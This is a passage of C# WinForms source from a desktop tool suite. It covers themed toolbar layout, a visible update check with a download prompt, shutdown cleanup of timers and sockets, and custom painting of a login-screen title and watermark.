                    axis.MajorGrid.LineColor = SupeyTheme.Divider;
                    axis.MajorTickMark.LineColor = SupeyTheme.Divider;
                }
            }

            foreach (var series in tcchart.Series)
                series.Color = SupeyTheme.AccentPrimary;

            foreach (var legend in tcchart.Legends)
            {
                legend.BackColor = Color.Transparent;
                legend.ForeColor = SupeyTheme.TextSecondary;
            }
        }

        // The Templates toolbar mirrors the Schedule Builder header: a full-width docked band
        // with a hairline bottom divider and a single left-docked auto-size flow that arranges
        // uniform 30px-tall flat controls. No manual pixel math = no drift or clipping.
        private void EnsureTemplatesToolbarChrome()
        {
            if (materialCard12 == null || tbcb == null || tbtemplatenamecb == null || addtemplatebtn == null)
                return;

            if (_templatesToolbarPanel == null || _templatesToolbarPanel.IsDisposed)
            {
                _templatesToolbarPanel = new System.Windows.Forms.Panel
                {
                    Name = "templatesToolbarPanel",
                    Dock = DockStyle.Top,
                    Height = 56,
                    BackColor = SupeyTheme.SurfaceHeader,
                    Padding = new Padding(0),
                };

                var divider = new System.Windows.Forms.Panel
                {
                    Dock = DockStyle.Bottom,
                    Height = 1,
                    BackColor = SupeyTheme.Divider,
                };

                var leftFlow = new FlowLayoutPanel
                {
                    Name = "templatesToolbarLeftFlow",
                    Dock = DockStyle.Left,
                    FlowDirection = FlowDirection.LeftToRight,
                    WrapContents = false,
                    AutoSize = true,
                    AutoSizeMode = AutoSizeMode.GrowAndShrink,
                    BackColor = SupeyTheme.SurfaceHeader,
                    Padding = new Padding(14, 12, 0, 0),
                };

                var weekdayCaption = new Label
                {
                    Text = "Weekday",
                    AutoSize = true,
                    ForeColor = SupeyTheme.TextSecondary,
                    BackColor = SupeyTheme.SurfaceHeader,
                    Font = SupeyTheme.CaptionFont,
                    Margin = new Padding(0, 8, 10, 0),
                };
                var driverCaption = new Label
                {
                    Text = "Template driver",
                    AutoSize = true,
                    ForeColor = SupeyTheme.TextSecondary,
                    BackColor = SupeyTheme.SurfaceHeader,
                    Font = SupeyTheme.CaptionFont,
                    Margin = new Padding(0, 8, 10, 0),
                };

                ConfigureTemplatesCombo(tbcb, 150);
                ConfigureTemplatesCombo(tbtemplatenamecb, 240);

                if (_templatesAddBtn == null || _templatesAddBtn.IsDisposed)
                {
                    _templatesAddBtn = new SupeyButton
                    {
                        Text = "ADD TEMPLATE",
                        Kind = SupeyButton.Variant.Primary,
                        Size = new Size(150, 30),
                        Margin = new Padding(0, 1, 0, 0),
                    };
                    _templatesAddBtn.Click += (s, e) => addtemplatebtn_Click(addtemplatebtn ?? s, e);
                }

                leftFlow.Controls.Add(weekdayCaption);
                leftFlow.Controls.Add(tbcb);
                leftFlow.Controls.Add(driverCaption);
                leftFlow.Controls.Add(tbtemplatenamecb);
                leftFlow.Controls.Add(MakeFsToolbarSeparator());
                leftFlow.Controls.Add(_templatesAddBtn);

                _templatesToolbarPanel.Controls.Add(divider);
                _templatesToolbarPanel.Controls.Add(leftFlow);
                materialCard12.Controls.Add(_templatesToolbarPanel);
                _templatesToolbarPanel.BringToFront();
            }

            materialCard12.Resize -= MaterialCard12_ResizeTemplatesToolbar;
            materialCard12.Resize += MaterialCard12_ResizeTemplatesToolbar;

            // Default the weekday box to today so the tab never opens blank. The tab-change
            // handler reads tbcb.Text to populate the driver list (which auto-selects index 0),
            // so seeding the weekday gives both boxes a sensible default value.
            if (tbcb.SelectedIndex < 0 && tbcb.Items.Count > 0)
                tbcb.SelectedIndex = ((int)DateTime.Today.DayOfWeek + 6) % 7;

            LayoutTemplatesToolbarControls();
        }

        private void ConfigureTemplatesCombo(System.Windows.Forms.ComboBox cb, int width)
        {
            if (cb == null || cb.IsDisposed)
                return;
            cb.DropDownStyle = ComboBoxStyle.DropDownList;
            cb.FlatStyle = FlatStyle.Flat;
            cb.DrawMode = DrawMode.OwnerDrawFixed;
            cb.Font = new Font("Segoe UI", 9.5f, FontStyle.Regular);
            cb.ItemHeight = 24;
            cb.BackColor = SupeyTheme.SurfaceElevated;
            cb.ForeColor = SupeyTheme.TextPrimary;
            cb.Width = width;
            cb.Margin = new Padding(0, 1, 14, 0);
            cb.DrawItem -= TemplatesCombo_DrawItem;
            cb.DrawItem += TemplatesCombo_DrawItem;
        }

        // Dark owner-draw so the flat combos match the SupeyTheme surface (the system would
        // otherwise paint the closed box and dropdown rows in white).
        private void TemplatesCombo_DrawItem(object sender, DrawItemEventArgs e)
        {
            var cb = sender as System.Windows.Forms.ComboBox;
            if (cb == null) return;

            bool selected = (e.State & DrawItemState.Selected) == DrawItemState.Selected;
            Color back = selected ? SupeyTheme.ListSelected : SupeyTheme.SurfaceElevated;
            Color fore = selected ? SupeyTheme.ListSelectedText : SupeyTheme.TextPrimary;

            using (var b = new SolidBrush(back))
                e.Graphics.FillRectangle(b, e.Bounds);

            string text = e.Index >= 0 ? cb.GetItemText(cb.Items[e.Index]) : cb.Text;
            if (!string.IsNullOrEmpty(text))
            {
                var rect = new Rectangle(e.Bounds.X + 6, e.Bounds.Y, e.Bounds.Width - 8, e.Bounds.Height);
                TextRenderer.DrawText(e.Graphics, text, cb.Font, rect, fore,
                    TextFormatFlags.Left | TextFormatFlags.VerticalCenter | TextFormatFlags.EndEllipsis);
            }
        }

        private void MaterialCard12_ResizeTemplatesToolbar(object sender, EventArgs e)
        {
            LayoutTemplatesToolbarControls();
        }

        private void LayoutTemplatesToolbarControls()
        {
            if (_templatesToolbarPanel == null || _templatesToolbarPanel.IsDisposed || materialCard12 == null)
                return;

            if (templatelv != null && !templatelv.IsDisposed)
            {
                int listTop = _templatesToolbarPanel.Bottom + 10;
                int bottomPad = 18;
                templatelv.Location = new Point(18, listTop);
                templatelv.Size = new Size(
                    Math.Max(220, materialCard12.ClientSize.Width - 36),
                    Math.Max(180, materialCard12.ClientSize.Height - listTop - bottomPad));
            }
        }

        private void EnsureTripScoutToolbarChrome()
        {
            if (tsmaterialCard == null || tslv == null || tssearchbox == null ||
                tsdatepicker == null || tsloadbtn == null || tsstatuslbl == null)
                return;

            if (_tripScoutToolbarPanel == null || _tripScoutToolbarPanel.IsDisposed)
            {
                _tripScoutToolbarPanel = new System.Windows.Forms.Panel
                {
                    Dock = DockStyle.Top,
                    Height = 56,
                    BackColor = SupeyTheme.SurfaceHeader,
                    Padding = new Padding(0),
                    Name = "tripScoutToolbarPanel",
                };

                var divider = new System.Windows.Forms.Panel
                {
                    Dock = DockStyle.Bottom,
                    Height = 1,
                    BackColor = SupeyTheme.Divider,
                };

                var leftFlow = new FlowLayoutPanel
                {
                    Dock = DockStyle.Left,
                    FlowDirection = FlowDirection.LeftToRight,
                    WrapContents = false,
                    AutoSize = true,
                    AutoSizeMode = AutoSizeMode.GrowAndShrink,
                    BackColor = SupeyTheme.SurfaceHeader,
                    Padding = new Padding(12, 12, 0, 0),
                };
                _tripScoutToolbarLeftFlow = leftFlow;

                var rightFlow = new FlowLayoutPanel
                {
                    Dock = DockStyle.Right,
                    FlowDirection = FlowDirection.LeftToRight,
                    WrapContents = false,
                    AutoSize = true,
                    AutoSizeMode = AutoSizeMode.GrowAndShrink,
                    BackColor = SupeyTheme.SurfaceHeader,
                    Padding = new Padding(0, 12, 12, 0),
                };
                _tripScoutToolbarRightFlow = rightFlow;

                var searchLabel = new Label
                {
                    Text = "Search",
                    AutoSize = true,
                    ForeColor = SupeyTheme.TextSecondary,
                    BackColor = SupeyTheme.SurfaceHeader,
                    Font = SupeyTheme.CaptionFont,
                    Margin = new Padding(0, 8, 8, 0),
                };
                var dateLabel = new Label
                {
                    Text = "Service date",
                    AutoSize = true,
                    ForeColor = SupeyTheme.TextSecondary,
                    BackColor = SupeyTheme.SurfaceHeader,
                    Font = SupeyTheme.CaptionFont,
                    Margin = new Padding(0, 8, 8, 0),
                };

                tssearchbox.Margin = new Padding(0, 0, 0, 0);
                tssearchbox.Size = new Size(560, 30);
                tssearchbox.UseTallSize = false;
                tssearchbox.Hint = "Search trips by ID, client, driver, address, phone...";

                tsdatepicker.Margin = new Padding(0, 0, 6, 0);
                tsdatepicker.Size = new Size(232, 30);
                tsdatepicker.BorderColor = SupeyTheme.BorderSubtle;
                tsdatepicker.BorderSize = 1;
                tsdatepicker.Font = new Font("Segoe UI", 9.5f);
                tsdatepicker.SkinColor = SupeyTheme.SurfaceElevated;
                tsdatepicker.TextColor = SupeyTheme.TextPrimary;

                tsloadbtn.Text = "LOAD";
                tsloadbtn.UseAccentColor = false;
                tsloadbtn.AutoSize = false;
                tsloadbtn.Size = new Size(96, 30);
                tsloadbtn.Margin = new Padding(0, 1, 0, 0);
                tsloadbtn.HighEmphasis = true;

                leftFlow.Controls.Add(searchLabel);
                leftFlow.Controls.Add(tssearchbox);
                rightFlow.Controls.Add(MakeFsToolbarSeparator());
                rightFlow.Controls.Add(dateLabel);
                rightFlow.Controls.Add(tsdatepicker);
                rightFlow.Controls.Add(tsloadbtn);

                _tripScoutToolbarPanel.Controls.Add(divider);
                _tripScoutToolbarPanel.Controls.Add(rightFlow);
                _tripScoutToolbarPanel.Controls.Add(leftFlow);
                _tripScoutToolbarPanel.Resize += (_, __) => LayoutTripScoutToolbarControls();
            }

            if (!ReferenceEquals(_tripScoutToolbarPanel.Parent, tsmaterialCard))
                tsmaterialCard.Controls.Add(_tripScoutToolbarPanel);
            LayoutTripScoutToolbarControls();
        }

        private void LayoutTripScoutToolbarControls()
        {
            if (_tripScoutToolbarPanel == null || _tripScoutToolbarPanel.IsDisposed || tssearchbox == null ||
                _tripScoutToolbarRightFlow == null || _tripScoutToolbarRightFlow.IsDisposed)
                return;

            int reservedRight = _tripScoutToolbarRightFlow.Width + 56;
            int available = _tripScoutToolbarPanel.ClientSize.Width - reservedRight;
            int searchWidth = Math.Max(280, Math.Min(920, available));
            tssearchbox.Width = searchWidth;
        }

        /// <summary>
        /// Adds tab icons that aren't part of the designer-serialized <see cref="tabImageList"/> ImageStream.
        /// Any TabPage whose <c>ImageKey</c> points here must be registered before the tab strip paints.
        /// </summary>
        private void RegisterRuntimeTabIcons()
        {
            try
            {
                if (tabImageList != null && !tabImageList.Images.ContainsKey("magnify.png"))
                {
                    tabImageList.Images.Add("magnify.png", Properties.Resources.magnify);
                }
                if (tabImageList != null && !tabImageList.Images.ContainsKey("supey-shield.png"))
                {
                    tabImageList.Images.Add("supey-shield.png", Properties.Resources.supey_shield);
                }
            }
            catch
            {
                // Missing tab icons must never break form construction; the tab will just render without an image.
            }
        }

        /// <summary>Never load fonts or take locks inside <see cref="PictureBox.Paint"/> — that can break first-frame layout for MaterialSkin.</summary>
        private void Form1_OnLoad_DeferRevampPaintHook(object sender, EventArgs e)
        {
            Load -= Form1_OnLoad_DeferRevampPaintHook;
            try
            {
                EnsureRevampLoginFontsLoaded();
                if (pictureBox1 != null)
                {
                    pictureBox1.Paint += PictureBox1_PaintRevampTitle;
                    pictureBox1.SizeChanged += PictureBox1_SizeChanged_RevampInvalidate;
                    pictureBox1.Invalidate();
                }
            }
            catch
            {
                // Revamp title is optional; the rest of the app must still run.
            }
        }

        private void Form1_Shown_SyncLoginPanelFromSettings(object sender, EventArgs e)
        {
            Shown -= Form1_Shown_SyncLoginPanelFromSettings;
            if (Interlocked.CompareExchange(ref _startupMyPreciousPlayedFlag, 1, 0) == 0)
                Program.TryPlayStartupMyPreciousOnce();
            loginCB_SelectedIndexChanged(loginCB, EventArgs.Empty);
            try
            {
                pictureBox1?.Invalidate();
            }
            catch
            {
                // ignore
            }

            // Title-bar version + visible auto-check on launch (user explicitly didn't want this silent).
            // Errors here must never block the rest of Form1_Shown.
            try { InstallUpdateStatusUi(); } catch { }
            try { _ = RunStartupUpdateCheckAsync(); } catch { }
        }

        // ---------- Updates ----------

        private System.Windows.Forms.LinkLabel _updateStatusLink;
        private bool _updateInProgress;

        /// <summary>
        /// Sets the title bar to include the current version and adds a clickable bottom-right "Check for updates"
        /// link. Done in code (not the designer) so the existing layout isn't disturbed.
        /// </summary>
        private void InstallUpdateStatusUi()
        {
            try
            {
                Text = "Hiatme Tool Suite Blackout — " + UpdateClient.CurrentVersionDisplay;
            }
            catch { }

            try
            {
                _updateStatusLink = new System.Windows.Forms.LinkLabel
                {
                    AutoSize = true,
                    BackColor = System.Drawing.Color.Transparent,
                    LinkColor = System.Drawing.Color.FromArgb(180, 220, 255),
                    ActiveLinkColor = System.Drawing.Color.FromArgb(255, 255, 255),
                    VisitedLinkColor = System.Drawing.Color.FromArgb(180, 220, 255),
                    Font = new System.Drawing.Font("Segoe UI", 8.25f),
                    Text = "Check for updates · " + UpdateClient.CurrentVersionDisplay,
                    Cursor = System.Windows.Forms.Cursors.Hand,
                };
                _updateStatusLink.LinkClicked += async (s, e2) =>
                {
                    if (_updateInProgress) return;
                    await RunManualUpdateCheckAsync();
                };
                Controls.Add(_updateStatusLink);
                _updateStatusLink.BringToFront();
                PositionUpdateStatusLink();
                Resize += (_, __) => PositionUpdateStatusLink();
            }
            catch { }
        }

        private void PositionUpdateStatusLink()
        {
            if (_updateStatusLink == null || _updateStatusLink.IsDisposed) return;
            int margin = 8;
            int x = ClientSize.Width - _updateStatusLink.PreferredSize.Width - margin;
            int y = ClientSize.Height - _updateStatusLink.PreferredSize.Height - margin;
            _updateStatusLink.Location = new System.Drawing.Point(Math.Max(margin, x), Math.Max(margin, y));
        }

        private void SetUpdateLinkText(string text)
        {
            if (_updateStatusLink == null || _updateStatusLink.IsDisposed) return;
            _updateStatusLink.Text = text;
            PositionUpdateStatusLink();
        }

        /// <summary>Non-blocking auto-check on launch. Visible (not silent) status feedback in the bottom-right link.</summary>
        private async Task RunStartupUpdateCheckAsync()
        {
            // Tiny delay so the form is fully painted before we touch the link / pop a dialog.
            await Task.Delay(750);
            await RunUpdateCheckCoreAsync(promptOnNoUpdate: false);
        }

        /// <summary>User clicked "Check for updates" — always show a confirmation MessageBox, even when up-to-date.</summary>
        private async Task RunManualUpdateCheckAsync()
        {
            await RunUpdateCheckCoreAsync(promptOnNoUpdate: true);
        }

        private async Task RunUpdateCheckCoreAsync(bool promptOnNoUpdate)
        {
            if (_updateInProgress) return;
            _updateInProgress = true;
            try
            {
                SetUpdateLinkText("Checking for updates… · " + UpdateClient.CurrentVersionDisplay);
                UpdateManifest manifest;
                try
                {
                    manifest = await UpdateClient.FetchManifestAsync();
                }
                catch (Exception ex)
                {
                    SetUpdateLinkText("Update check failed · " + UpdateClient.CurrentVersionDisplay);
                    if (promptOnNoUpdate)
                        MessageBox.Show(this,
                            "Could not reach the update server.\n\n" + ex.Message,
                            "Check for updates", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                if (!UpdateClient.IsUpdateAvailable(manifest))
                {
                    SetUpdateLinkText("Up to date · " + UpdateClient.CurrentVersionDisplay);
                    if (promptOnNoUpdate)
                        MessageBox.Show(this,
                            "You're already running the latest version (" + UpdateClient.CurrentVersionDisplay + ").",
                            "Check for updates", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    return;
                }

                SetUpdateLinkText("Update available v" + manifest.Version + " · " + UpdateClient.CurrentVersionDisplay);

                using (var dlg = new UpdatePrompt(manifest))
                {
                    var res = dlg.ShowDialog(this);
                    if (res != DialogResult.OK || string.IsNullOrEmpty(dlg.DownloadedZipPath))
                        return;

                    if (!UpdateClient.LaunchUpdaterAndExit(dlg.DownloadedZipPath))
                    {
                        MessageBox.Show(this,
                            "Could not start the updater. Your install folder is missing Update.exe and it could not be extracted from the download.\n\n" +
                            "Install folder:\n" + AppDomain.CurrentDomain.BaseDirectory + "\n\n" +
                            "Downloaded zip:\n" + dlg.DownloadedZipPath + "\n\n" +
                            "Copy Update.exe from a full release zip into your install folder, or reinstall from HiatmeToolSuite-3.0.1.1.zip.",
                            "Update", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        return;
                    }

                    // Updater is running; close the main app cleanly so it can replace files.
                    Application.Exit();
                }
            }
            finally
            {
                _updateInProgress = false;
            }
        }

        // ---------- /Updates ----------

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            _applicationExitRequested = true;

            _employeeStatsLoadCts?.Cancel();
            _employeeStatsLoadCts?.Dispose();
            _employeeStatsLoadCts = null;

            StopRecurringUiTimers();
            StopClientListPollingTimer();
            ShutdownListenerAndTrackedSockets();
            CloseOtherOpenForms();

            try
            {
                if (pictureBox1 != null)
                {
                    pictureBox1.Paint -= PictureBox1_PaintRevampTitle;
                    pictureBox1.SizeChanged -= PictureBox1_SizeChanged_RevampInvalidate;
                }

            }
            catch
            {
                // ignore
            }

            DisposeRevampLoginFonts();

            try
            {
                _loginWatermarkTopFont?.Dispose();
                _loginWatermarkTopFont = null;
                _loginWatermarkBottomFont?.Dispose();
                _loginWatermarkBottomFont = null;
            }
            catch
            {
                // ignore
            }

            try
            {
                materialSkinManager?.RemoveFormToManage(this);
            }
            catch
            {
                // MaterialSkin API may differ by version.
            }

            InvalidateWellRydePortalSession();

            try
            {
                mcLoginHandler?.Client?.Dispose();
            }
            catch
            {
                // ignore
            }

            // HttpClient.Dispose can block the UI thread for a long time if a request is stalled.
            var http = ServerHttpClient;
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    http?.Dispose();
                }
                catch
                {
                    // ignore
                }
            });

            // Flush the geocoder's persistent cache so the freshest resolved addresses are on
            // disk before the process exits. Cheap (single file write) and prevents losing the
            // last few entries from a build that finished right before close.
            try { AddressGeocoder.Flush(); } catch { }

            base.OnFormClosing(e);
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            base.OnFormClosed(e);
            // Ensure the OS process ends even if something (native handles, COM, HttpClient pools)
            // keeps the CLR alive briefly — otherwise Visual Studio stays attached until you Stop Debugging.
            Environment.Exit(0);
        }

        private void StopRecurringUiTimers()
        {
            try
            {
                billtimer?.Stop();
                if (billtimer != null)
                    billtimer.Tick -= billtimer_Tick;
                billtimer?.Dispose();
                timer1?.Stop();
                hidegiftimer?.Stop();
                timekiller?.Stop();
                clientcounttimer?.Stop();
            }
            catch
            {
                // ignore
            }
        }

        private void StopClientListPollingTimer()
        {
            try
            {
                _clientListTimer?.Stop();
                _clientListTimer?.Dispose();
            }
            catch
            {
                // ignore
            }
            _clientListTimer = null;
        }

        private void ShutdownListenerAndTrackedSockets()
        {
            Socket[] copy;
            lock (_infoAlSocketsLock)
            {
                copy = _infoAlActiveSockets.ToArray();
                _infoAlActiveSockets.Clear();
            }
            foreach (Socket s in copy)
                TryShutdownSocket(s);

            foreach (Victim v in victim_list.ToList())
                TryShutdownSocket(v?.soket);

            victim_list.Clear();

            TryShutdownSocket(oursocket);
            oursocket = null;
        }

        private static void TryShutdownSocket(Socket s)
        {
            if (s == null)
                return;
            try
            {
                if (s.Connected)
                    s.Shutdown(SocketShutdown.Both);
            }
            catch
            {
                // ignore
            }
            try
            {
                s.Close();
            }
            catch
            {
                // ignore
            }
            try
            {
                s.Dispose();
            }
            catch
            {
                // ignore
            }
        }

        private void CloseOtherOpenForms()
        {
            try
            {
                foreach (Form f in Application.OpenForms.Cast<Form>().ToList())
                {
                    if (!ReferenceEquals(f, this))
                    {
                        try
                        {
                            f.Close();
                        }
                        catch
                        {
                            // ignore
                        }
                    }
                }
            }
            catch
            {
                // ignore
            }
        }



        
























        private void PictureBox1_SizeChanged_RevampInvalidate(object sender, EventArgs e)
        {
            try
            {
                (sender as PictureBox)?.Invalidate();
            }
            catch
            {
                // ignore
            }
        }

        /// <summary>Same geometry as <see cref="PictureBox1_PaintRevampTitle"/>.</summary>
        private static bool TryGetLoginRevampBitmapClientRectStatic(
            PictureBox pb,
            Font revampLargeR,
            Font revampRest,
            Graphics measureGraphics,
            out float destX,
            out float destY,
            out int bw,
            out int bh,
            out float revampInkBottomY)
        {
            destX = destY = 0f;
            bw = bh = 0;
            revampInkBottomY = 0f;
            if (pb == null || revampLargeR == null || revampRest == null || measureGraphics == null)
                return false;

            const string rLetter = "R";
            const string restLetters = "evamp";

            try
            {
                using (var format = (StringFormat)StringFormat.GenericTypographic.Clone())
                {
                    format.Alignment = StringAlignment.Near;
                    format.LineAlignment = StringAlignment.Near;

                    var g = measureGraphics;
                    var szR = g.MeasureString(rLetter, revampLargeR, int.MaxValue, format);
                    var szRest = g.MeasureString(restLetters, revampRest, int.MaxValue, format);
                    const float gapBetweenLetters = 6f;
                    const float padRight = 48f;
                    const float outlineHaloRight = 3f;
                    const float insetBottom = 0f;
                    const float minRescueInset = 8f;
                    float totalW = szR.Width + gapBetweenLetters + szRest.Width;
                    float restYOffset = (szR.Height - szRest.Height) * 0.35f;
                    const float evampExtraDown = 20f;
                    float blockHeight = Math.Max(szR.Height, restYOffset + szRest.Height);
                    float rightEdge = pb.ClientSize.Width - padRight - outlineHaloRight;
                    float bottomEdge = pb.ClientSize.Height - insetBottom;
                    float x = rightEdge - totalW;
                    float y = bottomEdge - blockHeight;
                    if (x < minRescueInset)
                        x = minRescueInset;
                    if (y < minRescueInset)
                        y = minRescueInset;
                    float restY = y + restYOffset + evampExtraDown;
                    float relRestY = restY - y;
                    float blockH = Math.Max(szR.Height, relRestY + szRest.Height);

                    const float layerPad = 6f;
                    bw = Math.Max(1, (int)Math.Ceiling(totalW + layerPad * 2f));
                    bh = Math.Max(1, (int)Math.Ceiling(blockH + layerPad * 2f));
                    destX = x - layerPad;
                    destY = y - layerPad;
                    // Watermark vertical anchor: client Y grows downward. Do NOT use destY+bh — the bitmap is taller than the red ink
                    // (transparent padding below glyphs). blockH also includes evampExtraDown layout slack; trim so inkBottom sits near real paint.
                    revampInkBottomY = destY + layerPad + blockH - evampExtraDown * 0.55f;
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }

        private const float LoginWatermarkShellTopPt = 21f;
        private const float LoginWatermarkShellBottomPt = 13f;

        private void EnsureWindowsStyleLoginWatermarkFonts()
        {
            if (_loginWatermarkTopFont != null && Math.Abs(_loginWatermarkTopFont.SizeInPoints - LoginWatermarkShellTopPt) > 0.05f)
            {
                _loginWatermarkTopFont.Dispose();
                _loginWatermarkTopFont = null;
            }

            if (_loginWatermarkBottomFont != null && Math.Abs(_loginWatermarkBottomFont.SizeInPoints - LoginWatermarkShellBottomPt) > 0.05f)
            {
                _loginWatermarkBottomFont.Dispose();
                _loginWatermarkBottomFont = null;
            }

            if (_loginWatermarkTopFont != null)
                return;

            _loginWatermarkTopFont = TryCreateWatermarkFont(new[] { "Segoe UI Semilight", "Segoe UI" }, LoginWatermarkShellTopPt);
            _loginWatermarkBottomFont = TryCreateWatermarkFont(new[] { "Segoe UI Light", "Segoe UI" }, LoginWatermarkShellBottomPt);
        }

        private static Font TryCreateWatermarkFont(string[] familyNamesInOrder, float sizeInPoints)
        {
            foreach (string name in familyNamesInOrder)
            {
                try
                {
                    return new Font(name, sizeInPoints, FontStyle.Regular, GraphicsUnit.Point);
                }
                catch (ArgumentException)
                {
                    // family not installed
                }
            }

            return new Font(SystemFonts.DefaultFont.FontFamily, sizeInPoints, FontStyle.Regular, GraphicsUnit.Point);
        }

        /// <summary>Shell-style text: soft light fill + subtle shadow (no “label” backplate).</summary>
        private static void DrawWindowsShellStyleWatermarkLine(
            Graphics g,
            string text,
            Font font,
            float x,
            float y,
            StringFormat format)
        {
            if (string.IsNullOrEmpty(text) || font == null)
                return;

            const int wmFillAlpha = 128; // ~50% opacity (0–255)
            const int wmShadowAlpha = 44;

            using (var shadow = new SolidBrush(Color.FromArgb(wmShadowAlpha, 0, 0, 0)))
            {
                const float d = 1f;
                g.DrawString(text, font, shadow, x - d, y, format);
                g.DrawString(text, font, shadow, x + d, y, format);
                g.DrawString(text, font, shadow, x, y - d, format);
                g.DrawString(text, font, shadow, x, y + d, format);
            }

            using (var fill = new SolidBrush(Color.FromArgb(wmFillAlpha, 236, 236, 236)))
                g.DrawString(text, font, fill, x, y, format);
        }

        /// <summary>Drawn in <see cref="PictureBox1_PaintRevampTitle"/> so it is not covered by the PictureBox image or MaterialSkin quirks.</summary>
        private void DrawLoginWatermarkOnPictureBox(Graphics g, PictureBox pb)
        {
            if (g == null || pb == null)
                return;

            EnsureWindowsStyleLoginWatermarkFonts();
            Font fontTop = _loginWatermarkTopFont;
            Font fontBottom = _loginWatermarkBottomFont;
            if (fontTop == null || fontBottom == null)
                return;

            try
            {
                g.ResetClip();
            }
            catch
            {
                // ignore
            }

            const string line1 = "AI Rework";
            const string line2 = "Hiatme Tool Suite v3 Blackout";

            float destX = 0f, destY = 0f;
            int bw = 0, bh = 0;
            float revampInkBottomY = 0f;
            bool haveRevamp = _revampFontLargeR != null
                && _revampFontRest != null
                && TryGetLoginRevampBitmapClientRectStatic(pb, _revampFontLargeR, _revampFontRest, g, out destX, out destY, out bw, out bh, out revampInkBottomY);

            const float padX = 2f;
            const float lineGapF = 1f;
            const int marginBottom = 6;
            const int marginTopMin = 4;
            const int marginSide = 8;
            // gapFromRevamp: added to yTop; positive values move the watermark DOWN. Usually 0.
            const int gapFromRevamp = 0;
            // Tuning: subtract from revampInkBottomY then Floor — smaller yTop = higher on screen. Ceil() pushed the block down by mistake once.
            // If the gap under REVAMP is wrong, adjust revampInkBottomY (TryGetLoginRevampBitmapClientRectStatic) and/or this pull constant.
            const float watermarkPullUpFromInkBottomPx = 96f;

            SizeF sz1;
            SizeF sz2;
            using (var scratch = new Bitmap(1, 1))
            using (var gMeas = Graphics.FromImage(scratch))
            using (var format = (StringFormat)StringFormat.GenericTypographic.Clone())
            {
                format.Alignment = StringAlignment.Near;
                format.LineAlignment = StringAlignment.Near;
                gMeas.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
                sz1 = gMeas.MeasureString(line1, fontTop, int.MaxValue, format);
                sz2 = gMeas.MeasureString(line2, fontBottom, int.MaxValue, format);
            }

            float textBlockW = Math.Max(sz1.Width, sz2.Width) + padX * 2f;
            textBlockW = Math.Max(textBlockW, 8f);
            float h1 = sz1.Height;
            float h2 = sz2.Height;
            float blockH = h1 + lineGapF + h2;

            int bottomLimit = pb.ClientSize.Height - marginBottom;

            float rightX;
            if (haveRevamp)
            {
                rightX = (float)Math.Round(destX + bw);
                rightX = Math.Min(pb.ClientSize.Width - marginSide, rightX);
            }
            else
            {
                rightX = pb.ClientSize.Width - marginSide;
            }

            float xCol = rightX - textBlockW;
            if (xCol < marginSide)
                xCol = marginSide;

            float yTop;
            if (haveRevamp)
            {
                // Smaller Y = closer to top of control = closer to REVAMP. Use Floor so we don't ceil upward.
                float anchor = revampInkBottomY - watermarkPullUpFromInkBottomPx + gapFromRevamp;
                yTop = Math.Max(marginTopMin, (float)Math.Floor(anchor));
                if (yTop >= pb.ClientSize.Height)
                    yTop = Math.Max(marginTopMin, bottomLimit - blockH);
            }
            else
            {
                float maxY = bottomLimit - blockH;
                yTop = Math.Max(marginTopMin, Math.Min(pb.ClientSize.Height - marginBottom - blockH, maxY));
            }

            float xText = xCol + padX;
            float y1 = yTop;
            float y2 = yTop + h1 + lineGapF;

            var state = g.Save();
            try
            {
                g.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
                g.SmoothingMode = SmoothingMode.AntiAlias;
                g.PixelOffsetMode = PixelOffsetMode.HighQuality;

                using (var format = (StringFormat)StringFormat.GenericTypographic.Clone())
                {
                    format.Alignment = StringAlignment.Near;
                    format.LineAlignment = StringAlignment.Near;
                    DrawWindowsShellStyleWatermarkLine(g, line1, fontTop, xText, y1, format);
                    DrawWindowsShellStyleWatermarkLine(g, line2, fontBottom, xText, y2, format);
                }
            }
            finally
            {
                g.Restore(state);
            }
        }

        private void PictureBox1_PaintRevampTitle(object sender, PaintEventArgs e)
        {
            var pb = sender as PictureBox;
            if (pb == null)
                return;

            try
            {
                if (_revampFontLargeR != null && _revampFontRest != null)
                {
                    var g = e.Graphics;
                    var hintRestore = g.TextRenderingHint;

                    const string r = "R";
                    const string rest = "evamp";
                    using (var format = (StringFormat)StringFormat.GenericTypographic.Clone())
                    {
                        format.Alignment = StringAlignment.Near;
                        format.LineAlignment = StringAlignment.Near;

                        var szR = g.MeasureString(r, _revampFontLargeR, int.MaxValue, format);
                        var szRest = g.MeasureString(rest, _revampFontRest, int.MaxValue, format);
                        const float gapBetweenLetters = 6f;
                        const float padRight = 48f;
                        const float outlineHaloRight = 3f;
                        const float insetBottom = 0f;
                        const float minRescueInset = 8f;
                        float totalW = szR.Width + gapBetweenLetters + szRest.Width;
                        float restYOffset = (szR.Height - szRest.Height) * 0.35f;
                        const float evampExtraDown = 20f;
                        float blockHeight = Math.Max(szR.Height, restYOffset + szRest.Height);
                        float rightEdge = pb.ClientSize.Width - padRight - outlineHaloRight;
                        float bottomEdge = pb.ClientSize.Height - insetBottom;
                        float x = rightEdge - totalW;
                        float y = bottomEdge - blockHeight;
                        if (x < minRescueInset)
                            x = minRescueInset;
                        if (y < minRescueInset)
                            y = minRescueInset;
                        float restY = y + restYOffset + evampExtraDown;
                        float relRestY = restY - y;
                        float blockH = Math.Max(szR.Height, relRestY + szRest.Height);

                        const float layerPad = 6f;
                        int bw = Math.Max(1, (int)Math.Ceiling(totalW + layerPad * 2f));
                        int bh = Math.Max(1, (int)Math.Ceiling(blockH + layerPad * 2f));

                        void DrawMirroredROn(Graphics gb, float rx, float ry, Brush brush)
                        {
                            var st = gb.Save();
                            try
                            {
                                gb.TranslateTransform(rx + szR.Width, ry);
                                gb.ScaleTransform(-1f, 1f);
                                gb.DrawString(r, _revampFontLargeR, brush, 0f, 0f, format);
                            }
                            finally
                            {
                                gb.Restore(st);
                            }
                        }

                        using (var layer = new Bitmap(bw, bh, PixelFormat.Format32bppArgb))
                        {
                            using (var gb = Graphics.FromImage(layer))
                            {
                                gb.Clear(Color.Transparent);
                                gb.CompositingMode = CompositingMode.SourceOver;
                                gb.CompositingQuality = CompositingQuality.HighQuality;
